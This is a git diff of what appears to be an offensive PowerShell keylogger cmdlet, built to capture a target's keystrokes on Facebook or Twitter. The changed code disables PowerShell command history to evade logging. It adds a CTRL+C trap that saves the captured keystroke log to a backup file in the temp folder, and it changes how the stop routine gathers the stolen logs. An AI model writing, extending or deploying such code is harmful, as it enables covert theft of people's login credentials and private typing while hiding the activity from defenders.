@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: Get-Process,mscore.ps1
    Optional Dependencies: UserLand,Administrator
-   PS cmdlet Dev version: v1.1.8
+   PS cmdlet Dev version: v1.2.8
    
 .DESCRIPTION
    Capture target keyboard keystrokes if facebook or
@@ -97,7 +97,7 @@
 )
 
 
-$CmdletVersion = "v1.1.8"
+$CmdletVersion = "v1.2.8"
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
@@ -244,8 +244,21 @@ If($Action -iMatch '^(start)$')
                   Start-Sleep -Milliseconds 1600 # Give extra time for execution
                }
 
+               ## Prevent CTRL+C to brake logfile creation
+               # while the logfile its still beeing writen.
+               [console]::treatcontrolcasinput = $true
+               If([console]::keyavailable)
+               {
+                  $key = [system.console]::readkey($true)
+                  If(($key.modifiers -band [consolemodifiers]"control") -and ($key.key -eq "c"))
+                  {
+                     ## BackUp void.log (keystrokes logfile) because terminal console recieved CTRL+C command! 
+                     Get-Content -Path "$Env:TMP\void.log" -EA SilentlyContinue|Out-File "$Env:TMP\AUTO_BACKUP.${SocialSite}" -force
+                     exit  ## Exit then ..
+                  }
+               }
+
                write-host "   > key`logger running in background!"
-               Get-Content -Path "$Env:TMP\void.log" -EA SilentlyContinue|Out-File "$Env:TMP\BACKUP.LastCapture" -force
             }
             Else
             {
@@ -319,8 +332,7 @@ If($Action -iMatch '^(stop)$')
    }
 
 
-   ## Get the KeyStrokes from logfiles
-   $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter' /C:'.LastCapture'
+   $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter' /C:'AUTO_BACKUP.'    
    If(-not([string]::IsNullOrEmpty($GetLogNames)))
    {
       ForEach($Report in $GetLogNames)
